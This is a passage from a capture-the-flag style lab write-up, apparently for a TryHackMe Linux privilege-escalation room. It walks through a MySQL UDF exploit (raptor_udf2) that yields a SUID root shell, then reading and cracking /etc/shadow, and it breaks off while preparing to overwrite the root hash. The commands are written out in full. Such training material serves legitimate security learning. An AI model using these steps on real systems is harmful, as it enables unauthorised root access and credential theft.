+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../blue/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Blue
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../commandinjection/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Command Injection
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../commonlinuxprivesc/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Common Linux Privesc
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../crosssitescripting/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Cross-site Scripting
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../fileinclusion/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    File Inclusion
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../hydra/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Hydra
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../idor/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    IDOR
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../johntheripper/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    John the Ripper
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../kenobi/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Kenobi
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  <span class="md-ellipsis">
+    Linux PrivEsc
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  <span class="md-ellipsis">
+    Linux PrivEsc
+  </span>
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#task-1-introduction" class="md-nav__link">
+    <span class="md-ellipsis">
+      Task 1 - Introduction
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#task-2-service-exploits" class="md-nav__link">
+    <span class="md-ellipsis">
+      Task 2 - Service Exploits
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#task-3-weak-file-permissions-readable-etcshadow" class="md-nav__link">
+    <span class="md-ellipsis">
+      Task 3 - Weak File Permissions - Readable /etc/shadow
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#task-4-weak-file-permissions-writeable-etcshadow" class="md-nav__link">
+    <span class="md-ellipsis">
+      Task 4 - Weak File Permissions - Writeable /etc/shadow
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#task-5-weak-file-permissions-writable-etcpasswd" class="md-nav__link">
+    <span class="md-ellipsis">
+      Task 5 - Weak File Permissions - Writable /etc/passwd
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#task-6-sudo-shell-escape-sequences" class="md-nav__link">
+    <span class="md-ellipsis">
+      Task 6 - Sudo - Shell Escape Sequences
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#task-7-sudo-environment-variables" class="md-nav__link">
+    <span class="md-ellipsis">
+      Task 7 - Sudo - Environment Variables
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#task-8-cron-jobs-file-permissions" class="md-nav__link">
+    <span class="md-ellipsis">
+      Task 8 - Cron Jobs - File Permissions
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#task-9-cron-jobs-path-environment-variable" class="md-nav__link">
+    <span class="md-ellipsis">
+      Task 9 - Cron Jobs - PATH Environment Variable
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#task-10-cron-jobs-wildcards" class="md-nav__link">
+    <span class="md-ellipsis">
+      Task 10 - Cron Jobs - Wildcards
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#task-11-suidsgid-guid-executables-known-exploits" class="md-nav__link">
+    <span class="md-ellipsis">
+      Task 11 - SUID/SGID (GUID) Executables - Known Exploits
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#task-12-suidsgid-executables-shared-object-injection" class="md-nav__link">
+    <span class="md-ellipsis">
+      Task 12 - SUID/SGID Executables - Shared Object Injection
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#task-13-suidsgid-executables-environment-variables" class="md-nav__link">
+    <span class="md-ellipsis">
+      Task 13 - SUID/SGID Executables - Environment Variables
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#task-14-suidsgid-executables-abusing-shell-features-1" class="md-nav__link">
+    <span class="md-ellipsis">
+      Task 14 - SUID/SGID Executables - Abusing Shell Features (#1)
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#task-15-suidsgid-executables-abusing-shell-features-2" class="md-nav__link">
+    <span class="md-ellipsis">
+      Task 15 - SUID/SGID Executables - Abusing Shell Features (#2)
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#task-16-password-keys-history-files" class="md-nav__link">
+    <span class="md-ellipsis">
+      Task 16 - Password &amp; Keys - History Files
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#task-17-password-keys-config-files" class="md-nav__link">
+    <span class="md-ellipsis">
+      Task 17 - Password &amp; Keys - Config Files
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#task-18-passwords-keys-ssh-keys" class="md-nav__link">
+    <span class="md-ellipsis">
+      Task 18 - Passwords &amp; Keys - SSH Keys
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#task-19-nfs" class="md-nav__link">
+    <span class="md-ellipsis">
+      Task 19 - NFS
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#task-20-kernel-exploits" class="md-nav__link">
+    <span class="md-ellipsis">
+      Task 20 - Kernel Exploits
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#task-21-privilege-escalation-scripts" class="md-nav__link">
+    <span class="md-ellipsis">
+      Task 21 - Privilege Escalation Scripts
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../metasploitexploitation/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Metasploit - Exploitation
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../metasploitmeterpreter/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Metasploit - Meterpreter
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../motherssecret/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Mother's Secret
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../owaspjuiceshop/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    OWASP Juice Shop
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../owasptop10_2021/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    OWASP Top 10 - 2021
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../picklerick/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Pickle Rick
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../sqlinjection/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    SQL Injection
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../sqlinjectionlab/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    SQL Injection Lab
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ssrf/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    SSRF
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../steelmountain/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Steel Mountain
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../subdomainenumeration/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Subdomain Enumeration
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../traverse/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Traverse
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../uploadvulnerabilities/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Upload Vulnerabilities
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../vulnversity/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Vulnversity
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../whattheshell/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    What the Shell?
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#task-1-introduction" class="md-nav__link">
+    <span class="md-ellipsis">
+      Task 1 - Introduction
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#task-2-service-exploits" class="md-nav__link">
+    <span class="md-ellipsis">
+      Task 2 - Service Exploits
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#task-3-weak-file-permissions-readable-etcshadow" class="md-nav__link">
+    <span class="md-ellipsis">
+      Task 3 - Weak File Permissions - Readable /etc/shadow
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#task-4-weak-file-permissions-writeable-etcshadow" class="md-nav__link">
+    <span class="md-ellipsis">
+      Task 4 - Weak File Permissions - Writeable /etc/shadow
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#task-5-weak-file-permissions-writable-etcpasswd" class="md-nav__link">
+    <span class="md-ellipsis">
+      Task 5 - Weak File Permissions - Writable /etc/passwd
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#task-6-sudo-shell-escape-sequences" class="md-nav__link">
+    <span class="md-ellipsis">
+      Task 6 - Sudo - Shell Escape Sequences
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#task-7-sudo-environment-variables" class="md-nav__link">
+    <span class="md-ellipsis">
+      Task 7 - Sudo - Environment Variables
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#task-8-cron-jobs-file-permissions" class="md-nav__link">
+    <span class="md-ellipsis">
+      Task 8 - Cron Jobs - File Permissions
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#task-9-cron-jobs-path-environment-variable" class="md-nav__link">
+    <span class="md-ellipsis">
+      Task 9 - Cron Jobs - PATH Environment Variable
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#task-10-cron-jobs-wildcards" class="md-nav__link">
+    <span class="md-ellipsis">
+      Task 10 - Cron Jobs - Wildcards
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#task-11-suidsgid-guid-executables-known-exploits" class="md-nav__link">
+    <span class="md-ellipsis">
+      Task 11 - SUID/SGID (GUID) Executables - Known Exploits
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#task-12-suidsgid-executables-shared-object-injection" class="md-nav__link">
+    <span class="md-ellipsis">
+      Task 12 - SUID/SGID Executables - Shared Object Injection
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#task-13-suidsgid-executables-environment-variables" class="md-nav__link">
+    <span class="md-ellipsis">
+      Task 13 - SUID/SGID Executables - Environment Variables
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#task-14-suidsgid-executables-abusing-shell-features-1" class="md-nav__link">
+    <span class="md-ellipsis">
+      Task 14 - SUID/SGID Executables - Abusing Shell Features (#1)
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#task-15-suidsgid-executables-abusing-shell-features-2" class="md-nav__link">
+    <span class="md-ellipsis">
+      Task 15 - SUID/SGID Executables - Abusing Shell Features (#2)
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#task-16-password-keys-history-files" class="md-nav__link">
+    <span class="md-ellipsis">
+      Task 16 - Password &amp; Keys - History Files
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#task-17-password-keys-config-files" class="md-nav__link">
+    <span class="md-ellipsis">
+      Task 17 - Password &amp; Keys - Config Files
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#task-18-passwords-keys-ssh-keys" class="md-nav__link">
+    <span class="md-ellipsis">
+      Task 18 - Passwords &amp; Keys - SSH Keys
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#task-19-nfs" class="md-nav__link">
+    <span class="md-ellipsis">
+      Task 19 - NFS
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#task-20-kernel-exploits" class="md-nav__link">
+    <span class="md-ellipsis">
+      Task 20 - Kernel Exploits
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#task-21-privilege-escalation-scripts" class="md-nav__link">
+    <span class="md-ellipsis">
+      Task 21 - Privilege Escalation Scripts
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+  <h1>Linux PrivEsc</h1>
+
+<h2 id="task-1-introduction">Task 1 - Introduction<a class="headerlink" href="#task-1-introduction" title="Permanent link">&para;</a></h2>
+<p>The aim of this room is to walk us through a variety of Linux Privilege Escalation techniques. The room provides a vulnerable Debian VM to work on with the credentials: <code>user:password123</code>.</p>
+<p>Let's begin by connecting to the machine using ssh. Newer versions of OpenSSH have deprecated ssh-rsa so we will need to explicitly tell OpenSSH to use the encryption method. </p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="gp">$ </span>ssh<span class="w"> </span>user@&lt;Machine_IP&gt;<span class="w"> </span>-oHostKeyAlgorithms<span class="o">=</span>+ssh-rsa
+</code></pre></div>
+Running the <em>id</em> command, we get the following results:</p>
+<p><img alt="id" src="../../../assets/images/thm/linuxprivesc/01-id.png" /></p>
+<h2 id="task-2-service-exploits">Task 2 - Service Exploits<a class="headerlink" href="#task-2-service-exploits" title="Permanent link">&para;</a></h2>
+<p>In this task, we will be looking at exploiting MySQL for privilege escalation by taking advantage of User Defined Functions (UDF) to run system commands as root via the MySQL service. In order for us to do this, the MySQL service needs to be running on the target as root.</p>
+<p>UDF functions are language agnostic and can be written in any programming language to be complied natively into a shared library.</p>
+<p>Let's begin by confirming that the MySQL is running on the VM.</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="go">ps aux | grep mysql</span>
+</code></pre></div>
+<img alt="ps MySQL" src="../../../assets/images/thm/linuxprivesc/02-ps_mysql.png" /></p>
+<p>Based on the results above, we can confirm that the MySQL service is running on the target machine with root privileges.</p>
+<p>For this task, we are told that MySQL service is running as the root user with a <strong><em>blank password</em></strong>. Alternatively, we can also look in the <code>/etc/mysql/my.cnf</code> file (or other database connection files used by web applications) for any user passwords.</p>
+<p>Let's confirm the version of MySQL service running on the target machine. We can do this with one of the following commands.</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="go">mysql -V</span>
+<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="go">mysql -u root -p -e &#39;select @@version;&#39;</span>
+</code></pre></div>
+<img alt="MySQL Version" src="../../../assets/images/thm/linuxprivesc/03-mysql_version.png" /></p>
+<p>This version of MySQL has a vulnerability which allows users to run user-defined functions to execute commands.</p>
+<p><img alt="MySQL UDF Vuln" src="../../../assets/images/thm/linuxprivesc/04-mysql_udf_vuln.png" /></p>
+<p>The exploit can be downloaded from Exploit DB: <a href="https://www.exploit-db.com/exploits/1518">raptor_udf2.c</a></p>
+<p>Let's download the exploit code onto the target machine and compile the exploit code into a shared object file.</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="go">wget https://www.exploit-db.com/download/1518 -o raptor_udf2.c</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="go">gcc -g -c raptor_udf2.c -fPIC</span>
+<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="go">gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc</span>
+</code></pre></div>
+<img alt="UDF Compile" src="../../../assets/images/thm/linuxprivesc/05-mysql_compile_sharedlib.png" /></p>
+<p>We now need to connect to the MySQL database and determine the path of the <em>plugins directory</em> where MySQL stores its UDF functions.</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="go">mysql -u root -p</span>
+<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="go">show variables like &#39;%plugin%&#39;;</span>
+</code></pre></div>
+<img alt="MySQL Plugin Directory" src="../../../assets/images/thm/linuxprivesc/06-mysql_plugin.png" /></p>
+<p>One additional check we need to do is to check if the variable <em>secure_file_priv</em> is enabled to allow data import and export operations like <em>load_file</em> and <em>load_data</em> functions. A null/empty value means that the variable is disabled and thus we can load data into the database.</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="go">show variables like &#39;%secure_file_priv%&#39;;</span>
+</code></pre></div>
+<img alt="MySQL Secure File Priv" src="../../../assets/images/thm/linuxprivesc/07-mysql_secure_file_priv.png" /></p>
+<p>Now that we know the location where we need to store our malicious shared library, we can switch to the <em>mysql</em> database and create our user defined function which points to our compiled exploit.</p>
+<p>Let's switch to the database in question.</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="n">use</span><span class="w"> </span><span class="n">mysql</span><span class="p">;</span>
+</code></pre></div>
+<img alt="MySQL Switch Database" src="../../../assets/images/thm/linuxprivesc/08-mysql_switch_database.png" /></p>
+<p>Now import the shared library by inserting its contents into a table. We will first need to create a table into which we can import the library.</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="k">create</span><span class="w"> </span><span class="k">table</span><span class="w"> </span><span class="n">foo</span><span class="p">(</span><span class="n">line</span><span class="w"> </span><span class="nb">blob</span><span class="p">);</span>
+<a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a><span class="k">insert</span><span class="w"> </span><span class="k">into</span><span class="w"> </span><span class="n">foo</span><span class="w"> </span><span class="k">values</span><span class="p">(</span><span class="n">load_file</span><span class="p">(</span><span class="s1">&#39;/tmp/raptor_udf2.so&#39;</span><span class="p">));</span>
+</code></pre></div>
+<img alt="Insert Shared Library" src="../../../assets/images/thm/linuxprivesc/09-mysql_insert_sharedlib.png" /></p>
+<p>Now select the binary contents in the shared library and dump them into the plugins directory.</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">foo</span><span class="w"> </span><span class="k">into</span><span class="w"> </span><span class="n">dumpfile</span><span class="w"> </span><span class="s1">&#39;/usr/lib/mysql/plugin/raptor_udf2.so&#39;</span><span class="p">;</span>
+</code></pre></div>
+<img alt="MySQL Dump Sharedlib Contents" src="../../../assets/images/thm/linuxprivesc/10-mysql_dumpfile.png" /></p>
+<p>Finally, we need to create a function to call the shared library.</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="k">create</span><span class="w"> </span><span class="k">function</span><span class="w"> </span><span class="n">do_system</span><span class="w"> </span><span class="k">returns</span><span class="w"> </span><span class="nb">integer</span><span class="w"> </span><span class="n">soname</span><span class="w"> </span><span class="s1">&#39;raptor_udf2.so&#39;</span><span class="p">;</span>
+</code></pre></div>
+<img alt="MySQL Function" src="../../../assets/images/thm/linuxprivesc/11-mysql_function.png" /></p>
+<p>We can confirm if our function is present in the <em>mysql</em> database.</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">mysql</span><span class="p">.</span><span class="n">func</span><span class="p">;</span>
+</code></pre></div>
+<img alt="MySQL Function Confirm" src="../../../assets/images/thm/linuxprivesc/12-mysql_function_confirm.png" /></p>
+<p>We can now use the above created function to run system commands which will be executed as root. Let's go ahead and use our function to copy <code>/bin/bash</code> to the <code>/tmp/rootbash</code> and set the SUID bit.</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="k">select</span><span class="w"> </span><span class="n">do_system</span><span class="p">(</span><span class="s1">&#39;cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash&#39;</span><span class="p">);</span>
+</code></pre></div>
+<img alt="MySQL Function Call" src="../../../assets/images/thm/linuxprivesc/13-mysql_function_call.png" /></p>
+<p>We can exit out of MySQL and execute the <code>/tmp/rootbash</code> to privilege escalation.</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="go">./rootbash -p</span>
+</code></pre></div>
+<img alt="MySQL Root" src="../../../assets/images/thm/linuxprivesc/14-mysql_root.png" /></p>
+<p>Before continuing to the next task, we need to remove the <code>/tmp/rootbash</code> binary as we will be creating this file again in a future task.</p>
+<h2 id="task-3-weak-file-permissions-readable-etcshadow">Task 3 - Weak File Permissions - Readable /etc/shadow<a class="headerlink" href="#task-3-weak-file-permissions-readable-etcshadow" title="Permanent link">&para;</a></h2>
+<p>The <code>/etc/shadow</code> stores encrypted user password hashes and is only accessible to the root user and the shadow group. For more information on <code>/etc/shadow</code> file, see <a href="../../../notes/privesc_linux/passwdshadow/">Passwd/Shadow File</a>.</p>
+<p>In this task, we will be exploiting misconfigured permissions on the <code>/etc/shadow</code> file which makes it globally-readable. Let's start by looking at the permissions.</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="go">ls -l /etc/shadow</span>
+</code></pre></div>
+<img alt="Shadow Permissions" src="../../../assets/images/thm/linuxprivesc/15-shadow_perm.png" /></p>
+<p>As we can see, the file has been misconfigured to be writeable and readable by all other users. Let's look at the contents of the file.</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="go">cat /etc/shadow</span>
+</code></pre></div>
+<img alt="Shadow Content" src="../../../assets/images/thm/linuxprivesc/16-shadow_content.png" /></p>
+<p>We can use John the Ripper (John) to extract the root user's password. The process of using John to extract passwords from the <code>/etc/shadow</code> file requires two basic steps. We first have to use a utility called <em>unshadow</em> to combine the contents of <code>/etc/passwd</code> file with the contents of <code>/etc/shadow</code> file. We begin by copying the line for the root user from the <code>/etc/passwd</code> file and the <code>/etc/shadow</code> file to files <code>passwd.txt</code> and <code>shadow.txt</code> respectively. As John is not installed on the target VM, we will need to do these steps locally on our machine.</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="go">head -n 1 /etc/passwd &gt; passwd.txt</span>
+<a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a><span class="go">head -n 1 /etc/shadow &gt; shadow.txt</span>
+</code></pre></div>
+<img alt="Unshadow Prep" src="../../../assets/images/thm/linuxprivesc/17-unshadow_prep.png" /></p>
+<p>Copy the above files (or their contents) to our local machine and then use the <em>unshadow</em> command.</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="go">unshadow passwd.txt shadow.txt &gt; unshadowed.txt</span>
+</code></pre></div>
+<img alt="Unshadowed" src="../../../assets/images/thm/linuxprivesc/18-unshadow_file.png" /></p>
+<p>We now know proceed with using John to extract the password from the hash.</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a><span class="go">john --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt unshadowed.txt</span>
+</code></pre></div>
+<img alt="Shadow Password" src="../../../assets/images/thm/linuxprivesc/19-shadow_john.png" /></p>
+<p>With the above credentials we can now privilege escalate to the root user.</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a><span class="go">su root</span>
+</code></pre></div>
+<img alt="Shadow Root" src="../../../assets/images/thm/linuxprivesc/20-shadow_root.png" /></p>
+<h2 id="task-4-weak-file-permissions-writeable-etcshadow">Task 4 - Weak File Permissions - Writeable /etc/shadow<a class="headerlink" href="#task-4-weak-file-permissions-writeable-etcshadow" title="Permanent link">&para;</a></h2>
+<p>In the previous task, we found that the <code>/etc/shadow</code> file was writeable by all other users on the system. With the ability to modify the contents of the file, we can simply replace the root user's current password with a new one of our choosing. For more information on the <code>/etc/shadow</code> file format and password hash generation, see <a href="../../../notes/privesc_linux/passwdshadow/">Passwd/Shadow File</a>.</p>
+<p>To begin, let's generate a new password using the <em>OpenSSL</em> utility which comes pre-installed on most modern Linux operating systems.</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a><span class="go">openssl passwd -6 -salt salt pass123</span>
+</code></pre></div>
+<img alt="New Password Hash" src="../../../assets/images/thm/linuxprivesc/21-shadow_new_pass_hash.png" /></p>
